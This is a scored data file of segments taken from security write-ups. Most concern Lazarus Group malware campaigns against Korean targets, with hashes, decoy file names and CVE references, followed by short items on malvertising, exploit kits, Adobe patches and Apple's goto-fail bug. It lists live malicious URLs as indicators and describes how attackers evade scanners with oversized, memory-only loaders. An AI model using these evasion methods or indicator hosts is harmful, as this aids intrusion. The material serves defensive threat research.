d1aaf2f58def16caac1c8d3cb46df9f4,0.009076252758072556
11e9adc037b0409d0512504f348c2ffa064b418651c104f9ddddd8a12448bd06,0.01014657622651638
6e1e06b63fca99fe97e2e341cec0efa,0.00882972387473524
4ef025dd920c952595b5107ba5eaf89e3caedd2ae860754159c746d1c74743ab,0.01008022215872817
65da2d2c6726c05fc863c81a2b114c2a,0.00904621278898865
"Commonly, the file names were: wines.dll, winsec.dll, rdmgr.dll, tcpsys.dll, svcmgr.dll, rnamsvc.dll, httpcmgr.dll, icmpsec.dll and netmag.dll.",0.012467104972505916
Table 1 shows the confirmed cases of attacks.,0.014171653953867547
Time discovered,0.008587386393808849
Attack target,0.00906175084804528
Attack method,0.008215300465585051
Description,0.014276898542484706
5 July 2011,0.008663809887714757
University,0.010651580873044408
?,0.018354432538800758
11 April 2014,0.008319560444789875
Medical institution,0.010204001636463511
?,0.018354432538800758
"Sample of one of the pieces of malware linked to WannaCry (reported by
Symantec
[9])
Keylogger was also found",0.013088112414172404
Table 1: List of Redobot (KorDllbot) attacks.,0.015751448422554715
A report by Symantec found that the malware that attacked a medical institution in April 2014 was linked to WannaCry [9].,0.008001881959145862
Early version of Escad (2014),0.01008354746454554
"An early version of the Escad backdoor, which dates from as early as April 2014, used dots in the main text strings and encrypted its DLL file name using XOR 0xA7 encryption. This particular version is registered on the service and run by an executable dropper as an EXE file. The file length is around 100KB and it was not discovered until the spring of 2015.",0.010206882666946804
SHA256,0.009626279759872403
MD5,0.009411548072560616
258beb2a8d7df3c55cff946a36677350dcf9317aa426d343a67e616ca7540a52,0.010940347959645047
c44a91c69d8275e4173893499beb9315,0.008735043831880618
3e221003d89b629f3d9a9a75e5af90bf3d8d8c245e0b50ca4a34641ded4a44a2,0.01045103000503722
a5220e91d8daca4a6a6a75151efb8339,0.008830239699541775
"Often, malware impersonates a Microsoft Office file. The first variant of Escad to be discovered, in June 2014, infected systems using a dropper disguised as a screensaver installer.",0.010894837558335757
Time discovered,0.008587386393808849
Attack target,0.00906175084804528
Attack method,0.008215300465585051
Description,0.014276898542484706
June 2014,0.008215541422264216
?,0.018354432538800758
Fake screensaver installer,0.007774892477038331
Table 2: Early Escad attacks.,0.015354009500464394
SHA256,0.009626279759872403
MD5,0.009411548072560616
bf711a9967824bfe06d061af2c3edf077151e78a4fbc2c094065f3b0861afd05,0.009717587518894732
310f5b1bd7fb305023c955e55064e828,0.008749940329946804
d36f79df9a289d01cbb89852b2612fd22273d65b3579410df8b5259b49808a39,0.00956858460376242
bce2cf667396b79f6df3475dc2b1d63a,0.008928517329789054
6a9919037dd2111300e62493e3c8074901ec98232e5d9fc47ca2f93ca8ba4dc2,0.009673914638588355
964bf53c43c9168a3fa6dc6392cb3332,0.009076382668257832
Operation Red Dot (2014–2015),0.018129477107416858
"Variants of the malware used in the Sony Pictures hack were found in attacks which targeted the websites of North Korean research and governmental organizations, and the South Korean defence industry. AhnLab refers to these attacks – which occurred from 2014 to 2015 – as Operation Red Dot. The variants in this operation share similar code and names, such as AdobeArm.exe and msnconf.exe.",0.01398808151584452
"The main infection methods are: executable files disguised as document files (HWP, PDF), disguised installers, and exploits of Hangul Word Processor (HWP) file vulnerabilities.",0.0145037586972806
"The document files, which are listed in Table 3, are decoys disguised as legitimate documents, such as address books, deposit slips and invitations to lure victims into opening them.",0.015455936856110242
Original filename,0.008664645284770178
English translation,0.010417496594624431
Udb 2015-04호(4.10).exe,0.009876315493992704
"Data brief of a URI research and consulting company, April 2015 version",0.008120727827329755
김무성 문재인 차기 대선 양강 체제 구축.pdf.exe,0.021534141062660717
Kim Moo-sung and Moon Jae-in are the two top candidates in the next presidential election,0.01842784575069578
세종국가전략연수과정 19기 주소록.exe,0.02647581902072782
Address book for the 10th National Strategy Training Program of the Sejong Institute,0.01252333900384861
송금증.hwp.exe,0.01904825008075961
Deposit slip,0.009148017786645424
한국행정학회 학술대회 웹 초청장 최종.exe,0.01818090505588188
Final_Web invitation for the Korean Association for the Public Administration International Conference,0.011781855956197518
황교안 총리 지명 이후 당청 지지율 회복세.pdf.exe,0.01969459204306845
Approval rating of Hwang Kyo-ahn is recovering after being nominated as prime minister,0.014745514543685223
Table 3: Decoy files disguised as legitimate files.,0.019308970298256067
"The file names used in the Escad variant are: adobe.exe, AdobeArm.exe, AdobeFlash.exe, msdtc.exe and msnconf.exe.",0.012339445947965544
"Following the Sony Pictures hack in November 2014, Operation Red Dot started to persistently attack the defence industry and government institutions of South Korea, beginning in spring 2015.",0.017538749912858087
Date,0.010601038756765435
Attack target,0.00906175084804528
Attack method,0.008215300465585051
Description,0.014276898542484706
November 2014,0.008938224428710506
Sony Pictures,0.010467394385347828
?,0.018354432538800758
Sample for the Sony Pictures hack. This sample was first uploaded to VirusTotal in August 2014 but had been discovered in July 2014 in Korea.,0.01228074360847109
March 2015,0.008837336938163687
Political organization (?),0.011876450712517528
Installer of a security program,0.008059582082539096
Fake installer of a security program.,0.013534452785421869
April 2015,0.008509224445767627
Defence industry,0.009382780218312958
Executable file disguised as a document file,0.008087478656305658
Disguised as a deposit slip. First report of Duuzer.,0.012028495152613727
April 2015,0.008509224445767627
Political organization,0.0101624729197759
Executable file disguised as a document file,0.008087478656305658
Masqueraded as a web invitation for a Korean Association for Public Administration (KAPA) conference. Similar to an attack code sample for the Sony Pictures hack.,0.013728044194534883
May 2015,0.008169871832467646
Political organization,0.0101624729197759
Executable file disguised as document file,0.008087478656305658
Masqueraded as a document file relating to a presidential election.,0.01802905809410127
July 2015,0.008346316339107096
Conglomerate,0.007697965057281486
?,0.018354432538800758
Variant of Duuzer.,0.012035846730230726
August 2015,0.008723613363128324
Government,0.00934351662887245
?,0.018354432538800758
Variant of Duuzer.,0.012035846730230726
September 2015,0.009081852404730473
Defence industry,0.009382780218312958
HWP Vulnerability,0.006160043754368849
Loader-type malware.,0.01860589004598634
September 2015,0.009081852404730473
?,0.018354432538800758
Masqueraded as a security program module,0.007379418802638038
Masqueraded as a security program module and used normal certificates.,0.013130053513748075
October 2015,0.008605756971628464
?,0.018354432538800758
HWPx vulnerability (CVE-2015-6585),0.010382684548061683
Masqueraded as a resume of a person with experience working with the military.,0.014075277388093
October-November 2015,0.009290265895769312
Defence industry (ADEX participating companies),0.0199913192644543
HWPx vulnerability (CVE-2015-6585),0.010382684548061683
Masqueraded as promotional document for a national defence seminar.,0.016435014872610787
Table 4: List of Operation Red Dot attacks (2014–2015).,0.020457076871021274
"In March 2015, an installer was discovered that was designed to infect systems and that masqueraded as a security program used by political institutions.",0.011015001159628501
SHA256,0.009626279759872403
MD5,0.009411548072560616
b79faac94bde8481aea8ebd97fb506bdc6964105853b9a9f8523d7aad699e649,0.009798861985963359
82e195bc7302e8b64aedf48af889a376,0.0089384455217274
b6d540571b2cb58057631a108ecef2bba56251530565f380044f8359f7abaf40,0.009521261031481543
0a93ccec3824569f7bc55c520de4fc4f,0.008792958968549813
ecddd99fe084e01213edefb4dbc1d683d8ad88d832de34279615b231bce022b5,0.010674194606243637
ae44cb4b42debf7507313cfa56f1158d,0.009016865234142135
"While the intended target of this malware is not known, it is highly likely to be the users of the security program in question: various public and defence institutions.",0.013314423722367574
"Escad B type, known as Duuzer, was discovered in April 2015 following its attack on the defence industry and diplomatic institutions.",0.009413019276330203
The attacks on political institutions have continued since then. This variant uses the method of sending an executable file disguised as a document file instead of exploiting a vulnerability. The code of this variant is very similar to the code used in the Sony Pictures hack.,0.011022012556506922
"In September 2015, malware masquerading as a security module was distributed (5831e614d79f3259fd48cfd5cd3c7e8e2c00491107d2c7d327970945afcb577d_fa6ee9e969df5ca4524daa77c172a1a7).",0.009504456328442767
"At the same time, a zero-day attack began which exploited a Hangul World Processor (HWP) vulnerability (CVE-2015-6585).",0.014748613568312474
The South Korean media is often filled with news reports of attacks similar to the November 2014 Sony Pictures hack that are still active in Korea [10].,0.016525898508231496
"In October 2015, malware masquerading as a personal resume was discovered (794b5e8e98e3f0c436515d37212621486f23b57a2c945c189594c5bf88821228_1c67fb74d778c3ce15ac4890276f892f). The intended target of this attack is likely to be in the military as the work experience that was listed on the resume was mainly related to the military and North Korea.",0.012534845289000729
The attack on the defence industry that took place in the same month was a spear-phishing attack which impersonated the Korean Society for Aeronautical and Space Sciences (KSAS).,0.014906032505794031
"In this attack, emails were sent to targeted recipients with malicious attachments. When the recipients opened the attachment, which was disguised as an invitation (초청장.hwp), it used the HWP vulnerability (CVE-2015-6585) to install a backdoor on the recipient's computer (c5be570095471bef850282c5aaf9772f5baa23c633fe8612df41f6d1ebe4b565_02b5964f93bcd22c4f6cedd64c3b3de3).",0.0131623467108275
"In November 2015, an attack was made on the Seoul International Aerospace and Defense Exhibition (ADEX) participants using a malicious email entitled 'Top 10 Weapons Exhibited at the Seoul Air Show'. When the recipient opened the disguised attachment (33e99f86d1c94c2798ee1ded42d513824cbd487994691369b1b9b781ebda3947 _660b607e74c41b032a63e3af8f32e9f5), malware exploiting the HWP vulnerability was executed to infect the computer with Escad (ce0e43c2b9cb130cd36f1bc5897db2960d310c6e3382e81abfa9a3f2e3b781d7_5df43b35c806c0a47ce379feaf715ee7).",0.015997316766916292
The National Intelligence Service of Korea later revealed that a member of the National Assembly and their staff had been targeted by an attack which led to the leakage of governmental audit materials [11].,0.00907247965986735
Changes in malware,0.007057697526801854
"Redobot, an early version of Escad, is known to have been in the wild between April 2011 and April 2014. There are many differences between the early version and the newer variants of the malware that have been discovered since 2014. In March 2014, the first variant of the Escad DLL type was discovered. It continued to be active until March 2015.",0.011545703665496343
"The variants of Escad are mainly classified into types A, B and C.",0.007531308409245985
"Type A is the malware that was used to attack Sony Pictures and was first discovered in July 2014. It was used in attacks on political institutions in South Korea until April 2015. The characteristics of type A are that two IP addresses are set up in the main code, the name of the DLL file uses XOR 0xA7 encryption, and the string of the logging API is obfuscated with spaces and dots (.). Figure 4 shows a comparison of samples used in the South Korea attacks and the Sony Pictures hack.",0.01259854783772163
Figure 4: Comparison of samples used in the South Korea attacks and the Sony Pictures hack.,0.016088100446800424
"Like type A, type B (which is called Duuzer) sets up two IP addresses in the main code, but the format of the code has changed. It does not obfuscate the API address but uses the XOR command to request the encrypted DLL name and API to use.",0.011698068790916949
"Type C operates as a service and also sets up two IP addresses in the main code, just like types A and B. It uses its own decode routine to extract the DLL name, API and a backdoor command. Here, the code for the backdoor is identical to type A.",0.014103501716907108
Operation Big Pond (2015–2017),0.01621775332671982
"When compared with the malware discovered up to 2015, the variants discovered since 2016 show many differences in code and use new techniques to get around security programs.",0.01986880982869943
Examples of some of the major attacks are shown in Table 5.,0.012601223885436053
Date,0.010601038756765435
Target,0.008390118765377541
Method,0.008199774741448729
Description,0.014276898542484706
Sept 2015,0.00866767591493034
Defence contractor,0.00869579013079691
HWP vulnerability,0.004862630068267149
An attack using an HWP vulnerability. Dropped the loader.,0.010918257840884737
Nov 2015,0.00836950223816002
Conglomerate,0.007697965057281486
?,0.018354432538800758
Loaded malware from an encrypted igfxsrvks.lrc file.,0.013489954121292391
July 2016,0.008325889747475501
Shopping mall,0.010943752034889287
Spear phishing,0.009346852542368334
Attacked a shopping mall worker using a family photo in May 2016.,0.012861723293280392
Oct 2016,0.008485893541880674
ICT,0.010574465817208667
?,0.018354432538800758
An attack using the OpenType Font (CVE-2016-7256) vulnerability.,0.01307500932506056
Oct 2016,0.008485893541880674
Conglomerate,0.007697965057281486
?,0.018354432538800758
Discovered a loader in resources section that contains malware and reads encrypted files.,0.012423268297867884
Nov 2016,0.008267780314804796
Conglomerate,0.007697965057281486
?,0.018354432538800758
A loader with a huge file length.,0.009363448176388456
Feb 2017,0.009073941013245768
Financial institution,0.01074285424274568
?,0.018354432538800758
Attacked the vulnerability of logical network separation software.,0.009677546851761698
Aug 2017,0.009026948409643465
Conglomerate,0.007697965057281486
?,0.018354432538800758
Loaded an encrypted igcxsrvrs.lrc file.,0.01129468475094908
Table 5: List of Operation Big Pond (2015–2017) attacks.,0.012623531969022772
"The threat group behind Operation Big Pond attacked not only political institutions and defence contractors, but conglomerates, shopping malls and ICT companies. KrCERT said that, in 2016, this threat group attacked asset management solution developers, hosting companies, academic associations, media, logistics information service providers, etc. It attacked a financial institution using the vulnerability of network separation software in February 2017, and constantly attacked cryptocurrency exchanges throughout 2017.",0.013103649202322543
"The threat group used a zero-day vulnerability in its attack: AhnLab and KrCERT discovered the Open Type Font (CVE‑2016-7256) vulnerability and reported it to Microsoft in autumn 2016 [12]. The attacker had started to make attacks on this vulnerability in the summer of 2015, and these attacks went undiscovered for more than a year. According to KrCERT, the Script Engine Memory Corruption (CVE-2016-0189) vulnerability was also used in the attack.",0.009517117213302173
"The threat group used a few techniques to bypass security programs, such as 'loading' (generating malware of tens of megabytes in size and executing a file only within memory, without dropping it). The group understood that some security programs do not scan or perform behaviour analysis on files of huge sizes and thus increased the size of the malware file and executed the code only in memory (without creating an execution file) to avoid detection.",0.018708741940432927
"In the case of msnconf.exe (7807568335687dd7f707cadd7a7c8e7d79082f15c07d263230ed90bf601bfcc6_250115ddbbc54207825855b60049f75f), once the file is executed, a DLL file with random name is created, empty data is repeatedly added to the end of the file, and the size of the file is increased by 67,229,889 bytes (62439a4a5eb9c6b2c6559928481b3f2bad5c753c297b2f55e2642751a10ca654_ fa73530df2d2cec5e591a9d666fccfa2). Once the DLL file is executed, the encrypted code is unpacked into the memory and executed.",0.014023079329603116
"The malware in the form of a loader was first discovered in 2015, and was used at full-scale in 2016. There are two types of loaders: one that hides the actual malicious code (mainly the backdoor) in the encrypted area inside the malware, such as the resource section, and executes in the memory; and one that executes the malware inside the memory by reading the external encrypted file. In the case of an encrypted file, sometimes the specific function of the malware cannot be identified, because no encrypted data file is identified. Some loaders are huge in length – sometimes more than 50 megabytes.",0.009684303730834176
Operation Coin Rush (2017–2018),0.023507063010492768
"This threat group has been attacking cryptocurrency exchanges and research institutions since 2017. It posed as government authorities and disguised its malware with file names relating to tax audit requirements, criminal investigations, etc.",0.013138126106506443
Filename,0.007907979926735642
English translation,0.010417496594624431
(대검)2017임시113호 (마약류 매매대금 수익자 추정 지갑주소 164건).hwp,0.0217183343292755
(Prosecutor) 2017Temp. 113 (164 addresses of wallets of criminals).hwp,0.009729222405458704
[붙임]조사 당일 구비하여야 할 서류 1부.hwp,0.01851091369177149
[Attachment]documents to be submitted on the day of hearing.hwp,0.011869790253668744
국내 가상화폐의 유형별 현황 및 향후 전망.hwp,0.02005786929339315
Trend of cryptocurrencies in Korea.hwp,0.01047358553433575
나의 직장에 대한 생산성 향상을 위한 개선해야 할 문제점과 개선 방안.hwp,0.02203510306981049
Issues on improving productivity at work.hwp,0.007927260836297356
내부포털시스템 요구사항.hwp,0.01796247722484845
Requirements for internal portal system.hwp,0.006948767911874043
로그인 오류.hwp,0.01671883722888723
Login errors.hwp,0.007380365759814489
美 사이버 보안시장의 현재와 미래.hwp,0.018402038065788773
US cyber security market trend.hwp,0.009200612536386932
법인(개인)혐의거래보고내역.hwp,0.026578394126634652
Suspected transactions.hwp,0.009145037306381498
불균형한 관계의 유대와 인지적 부조화를 내포한 관계의 유대가 종업원의 성과에 미치는 영향에 관한 연구.hwp,0.02239082704642381
Study on impact of unbalanced relationship and recognition on performance of employees.hwp,0.010717667175705659
비트코인_지갑주소_및_거래번호.hwp,0.020199455247358333
Bitcoin wallet addresses and transaction no.hwp,0.013189454308319637
새로운 패밀리 랜섬웨어.hwp,0.018437129992841417
New family ransomware.hwp,0.010060952642932275
세무조사준비서류.hwp,0.021925655744296724
Docs for tax audit.hwp,0.009530937111561055
스타트업 투자 시장 활성화 방안.hwp,0.018940485728158096
Startup investment promotion plan.hwp,0.009568152893134063
양식1.hwp,0.014708086403870557
Form1.hwp,0.008303809925629846
전산 및 비전산 자료 보존요청서.hwp,0.01996675047245866
Data preservation request.hwp,0.009136063549636808
전자금융거래법 일부개정법률안.hwp,0.023793735538527372
Partial amendment proposal for Online Financial Transaction Act.hwp,0.012095613104697756
조직의 소금같은 존재인 ‘투명인간’에 주목하라.hwp,0.022626416026960694
Focus on the ‘invisible man’ who you must have in your organization.hwp,0.008951049798085475
환전_해외송금_한도_및_제출서류3.hwp,0.015375852449508676
Money transfer limits and forms3.hwp,0.009714383537501092
Table 6: Names of files used for attacks.,0.01287863835249059
"Hangul by Hancom is the most widely used word processing software in Korea and supports EPS (Enhanced PostScript), an Adobe image processing script. When there is an EPS in a Hangul file, the script is automatically executed when the document is opened, without any notice to users. The vulnerability that uses EPS (CVE-2015-2545) was discovered in 2015, and the malicious HWP document exploiting this vulnerability first appeared in September 2016. The vulnerability was still actively exploited as of July 2018. The EPS created by this group is noticeably different from the script codes of other threat groups active in Korea.",0.008460101849474433
"The most recently updated version of Hangul by Hancom does not allow the malicious script written in EPS be executed. However, since no new vulnerability in Hangul by Hancom has been found, it seems that the attack using this vulnerability will continue. Thus, it is important for users to apply the most recent security update in order to avoid the EPS script attack.",0.010739085336846865
Suspicious activities,0.009281014166940382
"Although they are somewhat different from the malware codes used to attack Sony Pictures, there are other examples of malware related to the Lazarus Group.",0.015460860669658683
Navepry,0.00939320308453373
"Navepry is known to be one of the pieces of malware created by Lazarus Group. It was first discovered in 2012, and has been seen in large volumes since 2014. This malware mixes the order of text strings of API addresses. Figure 5 shows the obfuscated strings.",0.011847387653230013
Figure 5: Obfuscated strings.,0.015826503410677373
"This malware contains text strings such as 'GY' and 'FZ', and executes the cmd.exe file in a unique way. Figure 6 shows the unique text string of Navepry.",0.011442507552516967
Figure 6: Unique text string of Navepry.,0.013579778487021521
"This malware was used to attack political institutions, defence contractors and large Korean companies.",0.014975968231543901
Date,0.010601038756765435
Target,0.008390118765377541
Method,0.008199774741448729
Description,0.014276898542484706
March 2015,0.008837336938163687
?,0.018354432538800758
Disguised as an installer,0.006925464635017753
Installation version of a security program used by political institutions.,0.01150466112112869
April 2015,0.008509224445767627
Defence contractor,0.00869579013079691
Exe file disguised as a HWP file,0.00785440720130337
April 2015,0.008509224445767627
Conglomerate,0.007697965057281486
?,0.018354432538800758
Disguised as an instant messenger.,0.012436864352794896
Table 7: List of Navepry attacks.,0.014714316494097157
"These codes mix up the order of API characters to make it impossible to read, and there are a few methods for doing so.",0.010022576962509522
Figure 7: Compare obfuscation codes of Navepry.,0.013191152576059184
"There are many differences between this malware and the Escad variants, but some mutations are similar to the existing Escad. This malware was discovered either alone or together with backdoors (such as Escad) on the systems of targets of the Lazarus Group. The malware seems to be being used by the same group, because the attacker sometimes used the Open Type Font vulnerability.",0.011525247268780348
Lazarus connections,0.008064585117926737
"The Lazarus Group can largely be divided into two separate groups: the one that focused on attacking the Korean military in 2008 and another that emerged via the 7.7 DDoS attack (Dozer) in 2009. Many reports on the Lazarus Group do not distinguish the two from one another. The exact number of individuals involved with the Lazarus Group is unknown, however, their new and variant attack method, which was used in the attack on the Seoul ADEX 2015 conference, suggests that they may now have more than two groups operating independently.",0.014843101654321122
"Initially, there was a clear connection between the two groups. Redobot dropper (37be47f8df3c94d365d693855d1af5ac8b94eedd1b3b3122586a6d48611230bb_49ace8a624dd22f3110f041a324d1646), discovered in 2011, contains a 'BMZA' text string.",0.009218898347380322
"The 'BM' text string was used in a malware attack on targets in the defence field in 2009 and 'BM6W' was also used in the 6.25 Cyber Terror(KorHigh) that took place on 25 June 2013. 'BM' is also used by Bmdoor, malware that was used in Operation Black Mine in 2014. The exact meaning of BM has not yet been identified. However, it is constantly included in the malware as if it is some form of signature used by its creators.",0.012062985974684803
"The malware used in the Sony Pictures hack also includes a unique cmd.exe command, which similarly remains a mystery.",0.01142257610962727
Conclusion,0.008171308922719556
"This threat group used various infiltration methods, such as spear phishing, watering hole attacks, webshell uploads, etc. to take over the computing networks of political institutions, defence contractors and large companies in 2014; defence contractors and major companies in 2015; and hosting companies and media companies in 2016. Since 2017 the attacks have been concentrated onto cryptocurrency exchanges.",0.013362883188464014
This threat group used zero-day vulnerabilities such as the VBScript vulnerability (CVE-2016-0189) and Open Type Font vulnerability (CVE-2016-7256) and attempts to bypass security programs using a loader that has a huge file size and by executing only in memory.,0.008660050072212488
"Pieces of malware that are similar to that used to hack into Sony Pictures are still being discovered. Now, this threat group is attacking targets not only in Korea, but also in other parts of the world. Many researchers are tracing and analysing this group. However, the malware used to hack Sony Pictures became so famous, that it would be easy for anyone to imitate it. When studying the relationship (of attacks) one must be fully aware of this fact.",0.015846483088556296
"Security experts around the world must work together to trace and study this threat group, which is active in all corners of the world.",0.018532080376359228
References,0.0158494738281566
"[1] Sayer, P. Malware attacks on two banks have links with 2014 Sony Pictures hack. CSO. https://www.csoonline.com/article/3069502/data-breach/malware-attacks-on-two-banks-have-links-with-2014-sony-pictures-hack.html.",0.01171338799818189
[2] https://www.thaicert.or.th/alerts/admin/2018/al2018ad001.html.,0.01349030456223499
"[3] Sherstobitoff, R. Analyzing Operation GhostSecret: Attack Seeks to Steal Data Worldwide. McAfee. https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/.",0.012004348820852218
"[4] Hesseldahl, A. Sony Pictures Investigates North Korea Link In Hack Attack. Recode. https://www.recode.net/2014/11/28/11633356/sony-pictures-investigates-north-korea-link-in-hack-attack.",0.012223267385684244
"[5] Corera, G. UK TV drama about North Korea hit by cyber-attack. BBC. https://www.bbc.com/news/technology-41640976.",0.0154073200980831
[6] Alert (TA14-353A). US-CERT. https://www.us-cert.gov/ncas/alerts/TA14-353A.,0.01383303547254855
[7] Operation BlockBuster. https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf.,0.011699043970327394
"[8] Fagerland, S. From Seoul To Sony: The History of the DarkSeoul Group and the Sony Intrusion Malware Destover. https://github.com/kbandla/APTnotes/issues/260.",0.012414257054133016
[9] WannaCry: Ransomware attacks show strong links to Lazarus group. Symantec Official Blog. https://www.symantec.com/connect/blogs/wannacry-ransomware-attacks-show-strong-links-lazarus-group.,0.015773263740117338
[10] http://www.etnews.com/20151007000172.,0.01030297946862646
[11] http://news.joins.com/article/18899410.,0.009194058809547934
[12] Hardening Windows 10 with zero-day exploit mitigations. Microsoft Secure. https://cloudblogs.microsoft.com/microsoftsecure/2017/01/13/hardening-windows-10-with-zero-day-exploit-mitigations/.,0.012019598385886954
[13] 사이버 침해사고 정보공유 세미나 자료집 2016년 4분기 (Analysis of recent APT attack and infringement cases 4Q 2016). KrCERT. https://www.boho.or.kr/data/reportView.do?bulletin_writing_sequence=25246.,0.013361231132441809
"[14] Park, S. Anatomy of attacks aimed at financial sector by the Lazarus group. https://www.slideshare.net/SeongsuPark8/area41-anatomy-of-attacks-aimed-at-financial-sector-by-the-lazarus-group-104315358/1.",0.012964919722498247
"[15] Jo H.; Lee, H.-J. Deep dive analysis of HWP malware targeting cryptocurrency exchange.
",0.017108297170699616
"Large Number of Adult Sites Distribute Malware Via AdXpansion Malvertising
Update (12/03): AdXpansion contacted us with the following statement:
Adxpansion can confirm that these ads were disabled within hours of first being reported but, unfortunately, our compliance efforts were unable to prevent the malvertiser from creating new accounts.
We work with the world’s leading security vendors, including RiskIQ, in an ongoing effort to fight malvertising.  In light of this recent incident, we are reviewing our compliance processes and have stopped supporting flash ads completely. We are committed to provide a safe environment for all parties working with us.
– –
While malvertising activity on adult sites has been ‘relatively’ quiet for some time, we started picking up dozens of attacks on moderately popular XXX portals, where moderate still means millions of daily visitors.
The modus operandi is quite straightforward and facilitated by a compromised Flash advert directly hosted and served by AdXpansion, an adult ad network, which triggers a hidden Flash exploit loaded from a seemingly innocent XML file. This technique has been used before in other self-sufficient Flash ad/exploit attacks.
This malvertising campaign has been running since at least Nov 21 and is affecting hundreds of adults sites. As soon as the rogue Flash advert is displayed in the browser (no click on it is required) it will attempt to load the exploit code.
Notable sites that were affected include:",0.011461469173853822
"drtuber.com (55.3 M)
nuvid.com (41.9 M)
eroprofile.com (14M)
iceporn.com (6.9M)
xbabe.com (4.2M)",0.01497870991480943
"Monthly traffic in millions, according to SimilarWeb.
The malicious advert:",0.015600236331327899
"Malwarebytes Anti-Exploit blocks the malicious advert when it attempts to load the remote exploit shell code.
Technical details
An attack on drtuber.com:",0.009006043742206149
"The Flash exploit resides inside of the second XML file loaded from malenkiyprince.website.
Same attack on iceporn.com distributes two different payloads at once:",0.005453540880076435
The decoded Flash exploit (CVE-2015-7645):,0.0073244772352868415
"We informed AdXpansion but have not received any response so far.
IOCs:
Malicious advert:",0.00919660371375186
"media.hw.adxpansion.com/20151020133155/037ca5bba3dbe2a84632ebb9f7f98fdc.swf
MD5: 037ca5bba3dbe2a84632ebb9f7f98fdc",0.009898911581505576
Flash exploit:,0.0060517687110922536
"malenkiyprince.website/XFdjcl42RmNnXVZRc1wGGAY.xml
MD5: f2145598b40e0b0506e6cb4b15513efd
Decoded SWF MD5: 146d4f6d149c1b0613e1be3f3a777eab",0.010431849548466987
Malware payloads:,0.0072310107346864605
"drtuber.com payload: 4bee00fbaede53b7b83192867717289c
iceporn.com payload (1/2): f502ecb0e450df366fb110d102f34ce0
iceporn.com payload (2/2): 3f7f1b51bdaccd3931ff78c154bda0b8
",0.00972947544732139
"Neutrino exploit kit fills in for Angler EK in recent malvertising campaigns
Update (06/13/2016): Still no sign of Angler EK activity since late June 6th PST. In the meantime, the actor known as ihateclowns/SadClowns traditionally associated with Angler was particularly active on the week-end, with malvertising attacks on adult sites all leveraging Neutrino EK.
Update (06/11/2016): Security researcher Kafeine has just published a comprehensive post about this major development with Angler EK. It may be too early to say, but this would be as big as the downfall of Blackhole.
Original Post:
We have seen an uptick in drive-by downloads via the Neutrino exploit kit in the past few days. In fact, this is true for various paths to infection and also confirmed by others such as Brad Duncan who saw Neutrino deliver CryptXXX via the pseudo-Darkleech and EITest campaigns.
Case in point, the recent large malvertising campaigns we wrote about are still going on but rather than using Angler EK to infect victims, we see the Neutrino exploit kit instead.
The following is a malvertising incident we caught on Yahoo!. As in previous cases, the rogue advertiser uses a shadowed domain to host the ad banner and malicious code. It’s worth pointing out that threat actors are using some of the open source OpenX ad serving code to profile their victims.
Disclosure timeline:",0.01713042474146642
"06/08/2016: Yahoo is informed via email
06/08/2016: Yahoo acknowledges receipt of our email
06/09/2016: Rogue subdomain goes offline
06/10/2016: Blog post about this incident is published",0.013872891078888339
Malvertising flow:,0.00780841875004612
"Publisher (Yahoo Taiwan): tw.yahoo.com
Yahoo ads: s.yimg.com/rq/darla/2-9-9/html/r-sf-flx.html
Fraudulent advertiser: watch.pnwpga[.]com/www/delivery/spcjs.php?{redacted}
Open redirect: p.rfihub.com/cm?forward=http://hiapi.t1arealize[.]top/blackness/aHVuY2hz
Neutrino EK landing: ufysefs.t1arealize[.]top/almost/1605620/unhappy-career-health
Neutrino Flash Exploit (CVE-2016-4117): hiapi.t1arealize[.]top/1977/11/19/pant/member/symbol-twist-beach-victory-wait-jail.html.swf",0.012512744620991612
"Neutrino has been dropping ransomware lately, mainly CryptXXX but we have also seen it drop Cerber. At the moment, both Angler and Neutrino can exploit Flash Player up to version 21.0.0.213. This switch between the two is not new but this very noticeable change in activity remains intriguing. After all, without Angler the exploit kit landscape just isn’t the same.
",0.012641809210736876
"Adobe Updates
Adobe has just released an update for 20 vulnerabilities in Shockwave Player, most of which could allow an attacker to execute malicious code. The bulletin APSB10-20 – Security update available for Shockwave Player – refers. According to Jeremy Kirk's Macworld report and the Adobe advisory, the vulnerabilities affect both Windows and OS X versions up to",0.01026199621093904
25 Aug 2010 - 01:20PM,0.011672439861787232
"Adobe has just released an update for 20 vulnerabilities in Shockwave Player, most of which could allow an attacker to execute malicious code. The bulletin APSB10-20 – Security update available for Shockwave Player – refers. According to Jeremy Kirk's Macworld report and the Adobe advisory, the vulnerabilities affect both Windows and OS X versions up to",0.010402009529314471
"Adobe has just released an update for 20 vulnerabilities in Shockwave Player, most of which could allow an attacker to execute malicious code. The bulletin APSB10-20 – Security update available for Shockwave Player – refers.",0.01124158570045497
"According to Jeremy Kirk's Macworld report and the Adobe advisory, the vulnerabilities affect both Windows and OS X versions up to version 11.5.7.609. The patched version is 11.5.8.612. Adobe categorizes this update as critical .",0.013802489774770721
"APSB10-17 addresses security updates available for Adobe Reader and Acrobat, and goes back to August 19th, The critical vulnerabilities it is concerned with are in Adobe Reader 9.3.3 and earlier for Windows, Macintosh and UNIX; Adobe Acrobat 9.3.3 and earlier for Windows and Macintosh; Adobe Reader 8.2.3 and earlier versions; Adobe Acrobat 8.2.3 and earlier for Windows and Macintosh.",0.013812310623211976
"CVE-2010-2862 refers, and the update is rated as critical.",0.012252195634529395
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"UPDATE: Apple in hot water after SSL/TLS validation fiasco
Update (Feb 25):
#Apple releases OS X Update 10.9.2 which fixes #gotofail #SSL/#TLS flaw. pic.twitter.com/QJ3G4DIUsx — Jérôme S. (@jeromesegura) February 25, 2014
More info on the update can be found here.
Original story:
Releasing a software update right before the weekend is something that software vendors tend to stay away from because of its inherent risks. And yet this is precisely what Apple did last Friday when they pushed a security update which immediately prompted many people to dissect it.",0.009695474756185374
“An attacker with a privileged network position may capture or modify data in sessions protected by SSL/TLS“.,0.015272716811486342
"The flaw (CVE-2014-1266) affects certain versions of iOS (iPod, iPad and iPhone) and OS X (laptop / desktop).
In layman’s terms, if you are connected to a public WiFi, an attacker could eavesdrop on all your HTTPS encrypted traffic by creating a fake digital certificate.
Normally, a fake digital certificate would throw a warning such as this:",0.012974038502284624
The problem lies with failing to check a digital certificate in what has been called the “gotofail“. This bug is very serious because that validation check no longer happens:,0.010041600374801951
"For some yet undetermined (but yet very controversial) reason, a redundant “goto fail;” (in red) statement was inserted in the code bypassing a critical check (in green).
